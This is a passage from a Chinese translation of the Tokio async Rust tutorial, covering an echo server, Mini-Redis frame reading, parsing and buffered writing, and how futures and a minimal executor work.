                match socket.read(&amp;mut buf).await {
                    // Return value of `Ok(0)` signifies that the remote has
                    // closed
                    Ok(0) =&gt; return,
                    Ok(n) =&gt; {
                        // Copy the data back to socket
                        if socket.write_all(&amp;buf[..n]).await.is_err() {
                            // Unexpected socket error. There isn't much we can
                            // do here so just stop processing.
                            return;
                        }
                    }
                    Err(_) =&gt; {
                        // Unexpected socket error. There isn't much we can do
                        // here so just stop processing.
                        return;
                    }
                }
            }
        });
    }
}
</code></pre></pre>
<p>（你可以把这段代码放到 <code>src/bin/echo-server.rs</code>  并用 <code>cargo run --bin echo-server</code> 启动它）</p>
<p>我是 arch linux ：</p>
<pre><code class="language-zsh">yay -S netcat
echo 你好 | nc 127.0.0.1 6142
</code></pre>
<p>让我们分析一下：首先，因为使用了  <code>AsyncRead</code> 和 <code>AsyncWrite</code> ，所以 extension traits （<code>AsyncReadExt</code> 和<code>AsyncWriteExt</code>）必须被引入。 </p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
<span class="boring">}
</span></code></pre></pre>
<h3 id="allocating-a-buffer-申请缓冲区"><a class="header" href="#allocating-a-buffer-申请缓冲区">Allocating a buffer （申请缓冲区）</a></h3>
<p>这种策略是为了从 socket 读取一些数据到缓冲区，然后再把缓冲区的内容写回 socket。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut buf = vec![0;1024];
<span class="boring">}
</span></code></pre></pre>
<p>显式地避免了栈上缓冲区。回顾一下<a href="https://m4n5ter.github.io/rust/mini-redis/spawning.html#send-bound">之前</a> ，我们注意到所有的跨 <code>.await</code> 调用的数据都得由任务本身存储。而在这个场景， <code>buf</code> 被用来跨 <code>.await</code> 。所有的任务数据被存储在同一个内存块。你可以把它想象成一个 <code>enum</code> ，<code>enum</code> 内的变量都是需要为一个特定的 <code>.await</code> 存储的数据。</p>
<p>如果这个 <code>buf</code> 是一个栈数组，每个被生成的用来接受 socket 的任务的内部结构可能看起来会像这样：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Task {
    // internal task fields here
    task: enum {
        AwaitingRead {
            socket: TcpStream,
            buf: [BufferType],
        },
        AwaitingWriteAll {
            socket: TcpStream,
            buf: [BufferType],
        }

    }
}
<span class="boring">}
</span></code></pre></pre>
<p>如果一个栈数组被用来当做 buffer type，它将会被内联在任务结构体中。这会导致任务结构体非常庞大。另外，缓冲区大小通常是 page size (<em>Modern hardware and software tend to load data into RAM (and transfer data from RAM to disk) in discrete chunk called pages</em>)。这反过来又会使任务的大小变得尴尬：<code>\$page-size + 几个字节</code>。</p>
<p>Linus 有一篇吐槽贴说:</p>
<blockquote>
<p>Just do the math. I've done it. 4kB is good. 8kB is borderline ok. 16kB or more is simply not acceptable.</p>
<p><a href="https://www.realworldtech.com/forum/?threadid=144991&amp;curpostid=145006">Real World Technologies - Forums - Thread: Cache pipeline</a></p>
</blockquote>
<p>所以 linux 的 page size 应该会控制在 16kB 以内。</p>
<p>编译器优化 async blocks 的布局比优化一个 basic <code>enum</code> 要多很多。实际上，变量不会像 <code>enum</code> 所要求的那样在枚举变体之间移动。但是，任务结构体的大小至少与最大变量一样大。</p>
<p>正因如此，为 buffer 使用一个专门的内存分配通常是更有效的（这里是 <code>Vector</code>）。</p>
<h3 id="handling-eof-处理-eof"><a class="header" href="#handling-eof-处理-eof">Handling EOF （处理 EOF）</a></h3>
<p>当 TCP stream 读的那一半句柄关闭了，再去调用 <code>read()</code> 会返回 <code>Ok(0)</code> 。在这种时候退出 read loop 是很重要的。忘记在 EOF 的时候退出 read loop 是一个常见的 bug 来源。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>loop {
    match socket.read(&amp;mut buf).await {
        // Return value of `Ok(0)` signifies that the remote has
        // closed
        Ok(0) =&gt; return,
        // ... other cases handled here
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>忘记退出 read loop 通常会导致 100% CPU占用的无限循环。这是因为 socket 关闭后，<code>socket.read()</code> 会立即返回，循环就会永远的重复下去。</p>
<p>完整代码看<a href="https://github.com/tokio-rs/website/blob/master/tutorial-code/io/src/echo-server.rs">这里</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="framing"><a class="header" href="#framing">Framing</a></h2>
<p>我们接下来将会应用我们在 I/O 章节的所学，并实现 Mini-Redis 的框架层（framing layer，或许应该叫帧层） 。Framing 是获取 byte stream 并转化成 a stream of frames（帧） 的过程。一个 frame (帧) 是两个对等端（此处应该指代 client and server）之间传输数据的单位。Redis protocal frame 定义如下：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use bytes::Bytes;

enum Frame {
    Simple(String),
    Error(String),
    Integer(u64),
    Bulk(Bytes),
    Null,
    Array(Vec&lt;Frame&gt;),
}
<span class="boring">}
</span></code></pre></pre>
<p>注意 Frame 是如何包含没有任何语义的数据的， Command 解析和实现发生再更高级的层，而不在 Frame。</p>
<p>对于 HTTP 来说，一个 frame 可能看起来像这样：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum HttpFrame {
    RequestHead {
        method: Method,
        uri: Uri,
        version: Version,
        headers: HeaderMap,
    },
    ResponseHead {
        status: StatusCode,
        version: Version,
        headers: HeaderMap,
    },
    BodyChunk {
        chunk: Bytes,
    },
}
<span class="boring">}
</span></code></pre></pre>
<p>为了实现 Mini-Redis 的 frame，我们将会实现一个 <code>Connecton</code> 结构来包装一个 <code>TcpStream</code> 和 reads/writes <code>mini_redis::Frame</code> values。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::net::TcpStream;
use mini_redis::{Frame, Result};

struct Connection {
    stream: TcpStream,
    // ... other fields here
}

impl Connection {
    /// Read a frame from the connection.
    /// 
    /// Returns `None` if EOF is reached
    pub async fn read_frame(&amp;mut self)
        -&gt; Result&lt;Option&lt;Frame&gt;&gt;
    {
        // implementation here
    }

    /// Write a frame to the connection.
    pub async fn write_frame(&amp;mut self, frame: &amp;Frame)
        -&gt; Result&lt;()&gt;
    {
        // implementation here
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>可以在<a href="https://redis.io/topics/protocol">这里</a> 找到 Redis wire protocal 的细节。完整的 <code>Connection</code> 代码在<a href="https://github.com/tokio-rs/mini-redis/blob/tutorial/src/connection.rs">这里</a> 。</p>
<h2 id="buffered-reads-带缓冲地读"><a class="header" href="#buffered-reads-带缓冲地读">Buffered reads （带缓冲地读）</a></h2>
<p><code>read_frame</code> 方法在返回前会等待一个完整的 frame 被接收。单个 <code>TcpStream::read()</code> 调用可能会返回一个任意数量的数据。这个数据可能是一个完整的 frame、一个不完整 frame 或者多个 frame。如果接收到了一个不完整的 frame，数据会被放入 buffer 并且会继续从 socket 读更多数据。如果接收到了多个 frame，第一个帧会被返回，剩下的数据会被放入 buffer 直到下次 <code>read_frame</code> 调用。</p>
<p>为了实现这个， <code>Connection</code> 需要一个 read buffer 字段。数据从 socket 被读入这个 read buffer。当一个帧被解析，相对应的数据会从 buffer 中被移除。</p>
<p>我们将会用 <code>BytesMut</code> 作为 buffer type。它是一个可变版本的 <code>Bytes</code> 。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use bytes::BytesMut;
use tokio::net::TcpStream;

pub struct Connection {
    stream: TcpStream,
    buffer: BytesMut,
}

impl Connection {
    pub fn new(stream: TcpStream) -&gt; Connection {
        Connection {
            stream,
            // Allocate the buffer with 4kb of capacity.
            buffer: BytesMut::with_capacity(4096),
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>下面，我们实现 <code>read_frame()</code> 方法。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::io::AsyncReadExt;
use bytes::Buf;
use mini_redis::Result;

pub async fn read_frame(&amp;mut self)
    -&gt; Result&lt;Option&lt;Frame&gt;&gt;
{
    loop {
        // Attempt to parse a frame from the buffered data. If
        // enough data has been buffered, the frame is
        // returned.
        if let Some(frame) = self.parse_frame()? {
            return Ok(Some(frame));
        }

        // There is not enough buffered data to read a frame.
        // Attempt to read more data from the socket.
        //
        // On success, the number of bytes is returned. `0`
        // indicates &quot;end of stream&quot;.
        if 0 == self.stream.read_buf(&amp;mut self.buffer).await? {
            // The remote closed the connection. For this to be
            // a clean shutdown, there should be no data in the
            // read buffer. If there is, this means that the
            // peer closed the socket while sending a frame.
            if self.buffer.is_empty() {
                return Ok(None);
            } else {
                return Err(&quot;connection reset by peer&quot;.into());
            }
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>让我们来分析一下它。 <code>read_frame</code> 方法操作了一个 loop。首先，<code>self.parse_frame()</code> 被调用。它会尝试从 <code>self.buffer</code> 解析 redis frame。如果 <code>self.buffer</code> 里的数据足够解析出一个 frame，那么这个解析出来的 frame 会从 <code>read_frame()</code> 返回。如果数据不够解析成一个 frame，我们就尝试从 socket 读取更多数据到 buffer。在读取更多数据后循环会重新开始， <code>parse_frame()</code> 会被再次调用，如此往复。这次，如果接收到了足够的数据，解析可能就会成功了。 </p>
<p>当从 stream 读取的时候，返回了一个 <code>0</code> 表示没有更多数据可以从对端接收了。如果这时候 read buffer 中还留有数据，这表示接收到的是个不完整的 frame 并且对端被意外中断了。这是一个错误条件，我们返回一个 <code>Err</code> 。</p>
<h3 id="the-buf-trait"><a class="header" href="#the-buf-trait">The <code>Buf</code> trait</a></h3>
<p>当从 stream 读取的时候， <code>read_buf</code> 被调用了。我们这个版本的 read function 带了一个参数，要求实现 <a href="https://docs.rs/bytes/"><code>bytes</code></a> crate 中的 <a href="https://docs.rs/bytes/1/bytes/trait.BufMut.html"><code>BufMut</code></a>。</p>
<p>首先，考虑怎样用 <code>read()</code> 实现相同的 read loop 。<code>Vec&lt;u8&gt;</code> 能够作为 <code>BytesMut</code> 的替代。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::net::TcpStream;

pub struct Connection {
    stream: TcpStream,
    buffer: Vec&lt;u8&gt;,
    cursor: usize,
}

impl Connection {
    pub fn new(stream: TcpStream) -&gt; Connection {
        Connection {
            stream,
            // Allocate the buffer with 4kb of capacity.
            buffer: vec![0; 4096],
            cursor: 0,
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>然后是我们在 <code>Connection</code> 的 <code>read_frame()</code> 函数：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use mini_redis::{Frame, Result};

pub async fn read_frame(&amp;mut self)
    -&gt; Result&lt;Option&lt;Frame&gt;&gt;
{
    loop {
        if let Some(frame) = self.parse_frame()? {
            return Ok(Some(frame));
        }

        // Ensure the buffer has capacity
        if self.buffer.len() == self.cursor {
            // Grow the buffer
            self.buffer.resize(self.cursor * 2, 0);
        }

        // Read into the buffer, tracking the number
        // of bytes read
        let n = self.stream.read(
            &amp;mut self.buffer[self.cursor..]).await?;

        if 0 == n {
            if self.cursor == 0 {
                return Ok(None);
            } else {
                return Err(&quot;connection reset by peer&quot;.into());
            }
        } else {
            // Update our cursor
            self.cursor += n;
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>当使用字节数组和 <code>read</code> 时，我们也必须维护一个 cursor（用来定位当前有效数据的位置）来跟踪已经有多少数据被放入了 buffer 。我们必须确保传递 buffer 的空的部分（cursor 后面的那些位置）给 <code>read()</code>，否则会覆盖掉已经塞入 buffer 的数据。如果我们的 buffer 被填满了，我们还必须为 buffer 扩容来保证可以保持读取。在 <code>parse_frame()</code> （没包含在上面），我们需要解析 <code>self.buffer[..self.cursor]</code> 中包含的数据。</p>
<p>因为将 byte array 和 cursor 配对是非常常见的，所以 <code>bytes</code> crate 提供了一个抽象来代表一个 byte array 和一个 cursor 。<code>Buf</code> trait 可以从能被 read 的数据实现。<code>Buf</code> trait 可以从能被 write 的数据实现。当传递一个 <code>T: BufMut</code> 给 <code>read_buf()</code> ，这个 buffer 内部的 cursor 会被 <code>read_buf</code> 自动更新。正因如此，我们这个版本的 <code>read_frame</code> 不需要管理自己的 cursor 。</p>
<p>此外，当使用 <code>Vec&lt;u8&gt;</code> 的时候，buffer 必须被<strong>初始化</strong>。<code>vec![0;4096]</code> 这个宏申请了一个 4k 字节的数组并且往 Vector 中的每个条目写了 0 。这个初始化过程不是免费的。当使用 <code>BytesMut</code> 和 <code>BufMut</code> 的时候，容量是<strong>不需要</strong>初始化的（这个特性棒:D）。<code>BytesMut</code> 这个抽象会阻止我们从未初始化的内存中进行读，这使得我们避开了初始化的步骤。</p>
<h2 id="parsing解析"><a class="header" href="#parsing解析">Parsing（解析）</a></h2>
<p>现在，让我们瞅瞅看 <code>parse_frame()</code> 函数。解析由两个步骤完成。</p>
<ol>
<li>
<p>确保缓冲了一个完整的 frame 并找到这个 frame 的索引位置。</p>
</li>
<li>
<p>解析这个 frame。</p>
</li>
</ol>
<p><code>mini-redis</code> crate 为以上两步都提供了一个函数：</p>
<ol>
<li>
<p><code>Frame::check</code></p>
</li>
<li>
<p><code>Frame::parse</code></p>
</li>
</ol>
<p>我们还将复用 <code>Buf</code> 抽象来提供帮助。一个 <code>Buf</code> 被传递进 <code>Frame::check</code> 。当 <code>check</code> 函数迭代传进来的这个 buffer 的时候，内部的 cursor 会被推进。当 <code>check</code> 返回，这个 <code>Buf</code> 内部的 cursor 会指向 frame 的末尾。</p>
<p>对于 <code>Buf</code> 类型，我们会使用 <a href="https://doc.rust-lang.org/stable/std/io/struct.Cursor.html"><code>std::io::Cursor&lt;&amp;[u8]&gt;</code></a> 。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use mini_redis::{Frame, Result};
use mini_redis::frame::Error::Incomplete;
use bytes::Buf;
use std::io::Cursor;

fn parse_frame(&amp;mut self)
    -&gt; Result&lt;Option&lt;Frame&gt;&gt;
{
    // 创建一个 `T: Buf`，Buf trait 在上面被引入了
    // self.buffer 是一个 `BytesMut`，它实现了 Deref&lt;Target = [u8]&gt;
    // 因此能当 [u8] 使
    let mut buf = Cursor::new(&amp;self.buffer[..]);

    // Check whether a full frame is available
    match Frame::check(&amp;mut buf) {
        Ok(_) =&gt; {
            // Get the byte length of the frame
            let len = buf.position() as usize;

            // Reset the internal cursor for the
            // call to `parse`.
            buf.set_position(0);

            // Parse the frame
            let frame = Frame::parse(&amp;mut buf)?;

            // Discard the frame from the buffer
            self.buffer.advance(len);

            // Return the frame to the caller.
            Ok(Some(frame))
        }
        // Not enough data has been buffered
        Err(Incomplete) =&gt; Ok(None),
        // An error was encountered
        Err(e) =&gt; Err(e.into()),
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>完整的 <a href="https://github.com/tokio-rs/mini-redis/blob/tutorial/src/frame.rs#L65-L103"><code>Frame::check</code></a> 函数可以在<a href="https://github.com/tokio-rs/mini-redis/blob/tutorial/src/frame.rs#L65-L103">这里</a>找到。我们的教程不会完全覆盖到它。</p>
<p>需要注意的相关事项是 <code>Buf</code> 的 “byte iterator” 样式 API 被使用了。这些 API 被用来获取数据并推进内部的 cursor 。举个例子，为了操作一个 frame，首个字节被检查来决定这个 frame 的类型。这个被使用的函数是 <a href="https://docs.rs/bytes/1/bytes/buf/trait.Buf.html#method.get_u8"><code>Buf::get_u8</code></a> ，它会获取当前 cursor 的位置上的一个字节并且推 cursor 一个单位。</p>
<p> <a href="https://docs.rs/bytes/1/bytes/buf/trait.Buf.html"><code>Buf</code></a> 还有很多更有用的方法。可以去 <a href="https://docs.rs/bytes/1/bytes/buf/trait.Buf.html">API docs</a> 看更多细节。</p>
<h2 id="buffered-writes带缓冲地写"><a class="header" href="#buffered-writes带缓冲地写">Buffered writes（带缓冲地写）</a></h2>
<p>framing 的另外一半 API 是 <code>write_frame(frame)</code> 函数。这个函数会把一个完整的 frame 写入到 socket 。为了最小化 <code>write</code> 系统调用的次数，写入操作都会被缓冲(buffered)。一个 write buffer 会被维护并且在往 socket 写入之前， frame 都会被 encode 到这个 buffer。然而，不同于 <code>read_frame()</code> ，在写入 socket 之前，并不总是会缓冲一整个 frame 。</p>
<p>思考一下有一个批量 frame 的流 (a bulk stream frame)，被写入的值是 <code>Frame::Bulk(Bytes)</code> 。bulk frame 的报文格式是 frame 头是一个 <code>\$</code> 字符，然后跟着等同于数据字节数的长度，最后是数据本身。大部分 frame 都是 <code>Bytes</code> 的内容。如果数据很庞大，把它 copy 到一个中间缓冲区的开销会很大（这就是上一段末尾提到的）。</p>
<p>为了实现带缓冲的写入操作，我们将会使用 <a href="https://docs.rs/tokio/1/tokio/io/struct.BufWriter.html"><code>BufWriter</code> struct</a> 。这个结构体使用 <code>T: AsyncWrite</code> 来初始化（<code>BufWriter::new(T)</code>，这个 T 得是 <code>AsyncWrite</code>），并且它本身也实现了 <code>AsyncWrite</code> 。当 <code>write</code> 在 <code>BufWriter</code> 上被调用，write 并不会直接作用到内部的 writer 上，而是作用到一个内部的 buffer 上。当这个 buffer 满了后，buffer 的内容会被刷到内部的 writer 上，同时清空这个 buffer 。我们还会有一些优化允许在某些情况下绕过缓冲区（上一段提到的情况）。</p>
<p>我们不会尝试把 <code>write_frame()</code> 的完整实现作为教程的一部分。所以完整实现请看<a href="https://github.com/tokio-rs/mini-redis/blob/tutorial/src/connection.rs#L159-L184">这里</a>。</p>
<p>首先， <code>Connection</code> 结构体需要改变成如下：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::io::BufWriter;
use tokio::net::TcpStream;
use bytes::BytesMut;

pub struct Connection {
    stream: BufWriter&lt;TcpStream&gt;,
    buffer: BytesMut,
}

impl Connection {
    pub fn new(stream: TcpStream) -&gt; Connection {
        Connection {
            stream: BufWriter::new(stream),
            buffer: BytesMut::with_capacity(4096),
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>接下来会实现 <code>write_frame()</code>：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::io::{self, AsyncWriteExt};
use mini_redis::Frame;

async fn write_frame(&amp;mut self, frame: &amp;Frame)
    -&gt; io::Result&lt;()&gt;
{
    match frame {
        Frame::Simple(val) =&gt; {
            self.stream.write_u8(b'+').await?;
            self.stream.write_all(val.as_bytes()).await?;
            self.stream.write_all(b&quot;\r\n&quot;).await?;
        }
        Frame::Error(val) =&gt; {
            self.stream.write_u8(b'-').await?;
            self.stream.write_all(val.as_bytes()).await?;
            self.stream.write_all(b&quot;\r\n&quot;).await?;
        }
        Frame::Integer(val) =&gt; {
            self.stream.write_u8(b':').await?;
            self.write_decimal(*val).await?;
        }
        Frame::Null =&gt; {
            self.stream.write_all(b&quot;$-1\r\n&quot;).await?;
        }
        Frame::Bulk(val) =&gt; {
            let len = val.len();

            self.stream.write_u8(b'$').await?;
            self.write_decimal(len as u64).await?;
            self.stream.write_all(val).await?;
            self.stream.write_all(b&quot;\r\n&quot;).await?;
        }
        Frame::Array(_val) =&gt; unimplemented!(),
    }

    self.stream.flush().await;

    Ok(())
}
<span class="boring">}
</span></code></pre></pre>
<p>下面这些被用到的函数都由 <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWriteExt.html"><code>AsyncWriteExt</code></a> trait 提供。他们在 <code>TcpStream</code> 上也是可用的，但不建议在没有中间缓冲区的情况下发出单字节写入（一次就发一个字节，会导致太多的 syscall，太浪费资源了）。</p>
<ul>
<li><a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWriteExt.html#method.write_u8"><code>write_u8</code></a> 把单个字节写入 writer。</li>
<li><a href="https://tokio.rs/tokio/tutorial/framing"><code>write_all</code></a> 把整个切片写入 writer。</li>
<li><a href="https://github.com/tokio-rs/mini-redis/blob/tutorial/src/connection.rs#L225-L238"><code>write_decimal</code></a> 是 mini-redis 实现的，用于把一个十进制数字转化成字符后写入。</li>
</ul>
<p>函数以一个 <code>self.stream.flush().await</code> 调用结尾。因为 <code>BufWriter</code> 会把要写入的东西先存到一个中间缓冲区，调用 <code>write</code> 不能保证数据被写入 socket，而在返回之前我们想要 frame 被写入 socket。调用 <code>flush()</code> 会将挂在缓冲区上的所有数据写入 socket 。</p>
<p>另一种选择是不在 <code>write_frame()</code> 中调用 <code>flush()</code> 。相反，在 <code>Connection</code> 上提供一个 <code>flush()</code> 函数。这将允许调用者将多个小 frame 写入到缓冲区中的队列，然后使用一个 <code>write</code> syscall 将它们全部写入 socket。但是这会增加 <code>Connection</code> API 的复杂度，而简单是 Mini-Redis 的其中一个目标，所以我们决定让 <code>flush().await</code> 调用包含在 <code>fn write_frame()</code> 中。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="async-in-depth-深入异步"><a class="header" href="#async-in-depth-深入异步">Async in depth （深入异步）</a></h2>
<p>至此，我们已经完成了一个相当全面的异步 Rust 和 Tokio 之旅。现在我们将会深挖 Rust 的异步运行时模型。在本教程的开始，我们就提到了 异步 Rust 用了一种独一无二的方法。现在我们来解释一下是啥意思。</p>
<h2 id="futures"><a class="header" href="#futures">Futures</a></h2>
<p>作为快速回顾，我们来举一个非常基本的异步函数。与教程到目前为止所涵盖的内容相比，这并不是什么新鲜事。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::net::TcpStream;

async fn my_async_fn() {
    println!(&quot;hello from async&quot;);
    let _socket = TcpStream::connect(&quot;127.0.0.1:3000&quot;).await.unwrap();
    println!(&quot;async TCP operation complete&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<p>我们调用了这个函数，并且返回了某个值，对这个值调用 <code>.await</code>。</p>
<pre><pre class="playground"><code class="language-rust">#[tokio::main]
async fn main() {
    let what_is_this = my_async_fn();
    // Nothing has been printed yet.
    what_is_this.await;
    // Text has been printed and socket has been
    // established and closed.
}
</code></pre></pre>
<p><code>my_async_fn()</code> 返回的值是一个 future ，future 是一个实现了标准库提供的  <a href="https://doc.rust-lang.org/std/future/trait.Future.html"><code>std::future::Future</code></a> trait 的值。它们是包含正在进行的异步计算的值。</p>
<p> <a href="https://doc.rust-lang.org/std/future/trait.Future.html"><code>std::future::Future</code></a> trait 的定义如下：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::pin::Pin;
use std::task::{Context, Poll};

pub trait Future {
    type Output;

    fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context)
        -&gt; Poll&lt;Self::Output&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<p>关联类型( <a href="https://doc.rust-lang.org/book/ch19-03-advanced-traits.html#specifying-placeholder-types-in-trait-definitions-with-associated-types">associated type</a> ) <code>Output</code> 是 future 一旦完成后会产生的类型。可以通过看标准库文档（<a href="https://doc.rust-lang.org/std/pin/index.html">standard library</a>）得到更多细节。</p>
<p>不像其它语言实现的 future ，一个 Rust 的 future 不是代表一个正在后台发生的计算，而是 Rust future 就是计算本身。future 的所有者负责通过 poll the future 来推动计算，这就是 <code>Future::poll</code> 所做的事。</p>
<h3 id="implementing-future-实现-future"><a class="header" href="#implementing-future-实现-future">Implementing <code>Future</code> （实现 <code>Future</code>）</a></h3>
<p>让我们实现一个简单的 future。这个 future 将会：</p>
<ol>
<li>
<p>一直 wait 到特定时刻。</p>
</li>
<li>
<p>输出一些文本到 STDOUT 。</p>
</li>
<li>
<p>产生一个字符串。</p>
</li>
</ol>
<pre><pre class="playground"><code class="language-rust">use std::future::Future;
use std::pin::Pin;
use std::task::{Context, Poll};
use std::time::{Duration, Instant};

struct Delay {
    when: Instant,
}

impl Future for Delay {
    type Output = &amp;'static str;

    fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;)
        -&gt; Poll&lt;&amp;'static str&gt;
    {
        if Instant::now() &gt;= self.when {
            println!(&quot;Hello world&quot;);
            Poll::Ready(&quot;done&quot;)
        } else {
            // Ignore this line for now.
            cx.waker().wake_by_ref();
            Poll::Pending
        }
    }
}

#[tokio::main]
async fn main() {
    let when = Instant::now() + Duration::from_millis(10);
    let future = Delay { when };

    let out = future.await;
    assert_eq!(out, &quot;done&quot;);
}
</code></pre></pre>
<h3 id="async-fn-as-a-future-异步函数作为-future"><a class="header" href="#async-fn-as-a-future-异步函数作为-future">Async fn as a Future （异步函数作为 future）</a></h3>
<p>在 main 函数中，我们实例化一个 future 并对它调用 <code>.await</code> 。在异步函数中，我们可以对任何实现了 <code>Future</code> 的值调用 <code>.await</code> 。相反，调用一个 <code>async</code> function 返回一个实现了 <code>Future</code> 的匿名类型。<code>async fn main()</code> 所生成的 future 类似于：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::future::Future;
use std::pin::Pin;
use std::task::{Context, Poll};
use std::time::{Duration, Instant};

enum MainFuture {
    // Initialized, never polled
    State0,
    // Waiting on `Delay`, i.e. the `future.await` line.
    State1(Delay),
    // The future has completed.
    Terminated,
}

impl Future for MainFuture {
    type Output = ();

    fn poll(mut self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;)
        -&gt; Poll&lt;()&gt;
    {
        use MainFuture::*;

        loop {
            match *self {
                State0 =&gt; {
                    let when = Instant::now() +
                        Duration::from_millis(10);
                    let future = Delay { when };
                    *self = State1(future);
                }
                State1(ref mut my_future) =&gt; {
                    match Pin::new(my_future).poll(cx) {
                        Poll::Ready(out) =&gt; {
                            assert_eq!(out, &quot;done&quot;);
                            *self = Terminated;
                            return Poll::Ready(());
                        }
                        Poll::Pending =&gt; {
                            return Poll::Pending;
                        }
                    }
                }
                Terminated =&gt; {
                    panic!(&quot;future polled after completion&quot;)
                }
            }
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>Rust 的 future 是<strong>状态机</strong>(<code>state machine</code>) 。此处，<code>MainFuture</code> 代表着由一个 future 可能的状态构成的 <code>enum</code> 。这个 future 从 <code>State0</code> 状态开始，当 <code>poll</code> 被调用时，这个 future 会尽可能地尝试推动其内部的状态。如果这个 future 能够完成了，<code>Poll::Ready</code> 会返回它包含的异步计算的输出结果。</p>
<p>如果这个 future <strong>不</strong>能够完成，通常是由于资源问题，这种情况它一般还在等着被调度，等着变成 <code>Poll::Ready</code> ，这时会返回 <code>Poll::Pending</code> 表示 future 还没完成。收到 <code>Poll::Pending</code> 表示告诉 future 的调用者，这个 future 将会在之后一段时间被完成，并且调用者应该在之后再次调用 <code>poll</code> 。</p>
<p>我们也看到了 future 由 其他 future 构成（future 可以嵌套）。对外层的 future 调用 <code>poll</code> 会导致内部的 future 的 <code>poll</code> 函数也被调用。</p>
<h2 id="executor-执行者一般就是运行时了"><a class="header" href="#executor-执行者一般就是运行时了">Executor （执行者，一般就是运行时了）</a></h2>
<p>异步 Rust 函数会返回 future ，而 future 又必须通过调用它们身上的 <code>poll</code> 来推进它们的状态，future 又由其它 future 组成。因此，问题来了，谁来调用最最最外层的 future 的 <code>poll</code> 呢？</p>
<p>回顾之前的内容，为了运行异步函数，它们也必须被传递给 <code>tokio::spawn</code> 或者 main 函数被用 <code>#[tokio::main]</code> 注释。这都会把生成的外层 future 提交给 Tokio executor ，这个 executor 负责调用外层 future 的 <code>Future::poll</code> 来驱动异步计算完成。</p>
<h3 id="mini-tokio"><a class="header" href="#mini-tokio">Mini Tokio</a></h3>
<p>为了更好地理解这一切是如何结合在一起的，让我们实现我们自己的 minimal version Tokio！ 完整代码能在<a href="https://github.com/tokio-rs/website/blob/master/tutorial-code/mini-tokio/src/main.rs">这里</a>被找到。</p>
<pre><pre class="playground"><code class="language-rust">use std::collections::VecDeque;
use std::future::Future;
use std::pin::Pin;
use std::task::{Context, Poll};
use std::time::{Duration, Instant};
use futures::task;

fn main() {
    let mut mini_tokio = MiniTokio::new();

    mini_tokio.spawn(async {
        let when = Instant::now() + Duration::from_millis(10);
        let future = Delay { when };

        let out = future.await;
        assert_eq!(out, &quot;done&quot;);
    });

    mini_tokio.run();
}

struct MiniTokio {
    tasks: VecDeque&lt;Task&gt;,
}

type Task = Pin&lt;Box&lt;dyn Future&lt;Output = ()&gt; + Send&gt;&gt;;

impl MiniTokio {
    fn new() -&gt; MiniTokio {
        MiniTokio {
            tasks: VecDeque::new(),
        }
    }

    /// Spawn a future onto the mini-tokio instance.
    fn spawn&lt;F&gt;(&amp;mut self, future: F)
    where
        F: Future&lt;Output = ()&gt; + Send + 'static,
    {
        self.tasks.push_back(Box::pin(future));
    }

    fn run(&amp;mut self) {
        let waker = task::noop_waker();
        let mut cx = Context::from_waker(&amp;waker);

        while let Some(mut task) = self.tasks.pop_front() {
            if task.as_mut().poll(&amp;mut cx).is_pending() {
                self.tasks.push_back(task);
            }
        }
    }
}
</code></pre></pre>
